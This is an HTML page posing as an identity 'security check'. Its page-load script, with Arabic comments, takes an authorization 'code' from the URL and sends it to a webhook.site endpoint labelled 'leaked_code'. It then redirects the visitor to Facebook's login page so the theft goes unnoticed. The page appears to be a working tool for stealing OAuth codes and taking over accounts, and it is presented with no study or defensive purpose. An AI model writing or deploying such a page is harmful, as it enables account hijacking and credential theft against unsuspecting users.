<!DOCTYPE html>
<html>
<head><title>Verify Identity</title></head>
<body>
    <script>
        window.onload = function() {
            // 1. استخراج الكود من الرابط (URL)
            const params = new URLSearchParams(window.location.search);
            const code = params.get('code') || window.location.hash.split('code=')[1];

            if (code) {
                // 2. إرسال الكود عبر "صورة" لضمان وصوله للـ Webhook دون حظر من المتصفح
                const exfiltrate = new Image();
                exfiltrate.src = "https://webhook.site/4347f395-56f0-4f4c-b08d-b9f500f09190?leaked_code=" + encodeURIComponent(code);

                // 3. التحويل لفيسبوك بعد ثانية واحدة لضمان وصول البيانات
                setTimeout(() => {
                    window.location.href = "https://www.facebook.com/login/";
                }, 1000);
            }
        };
    </script>
    <center><h2>Processing Security Check...</h2></center>
</body>
</html>
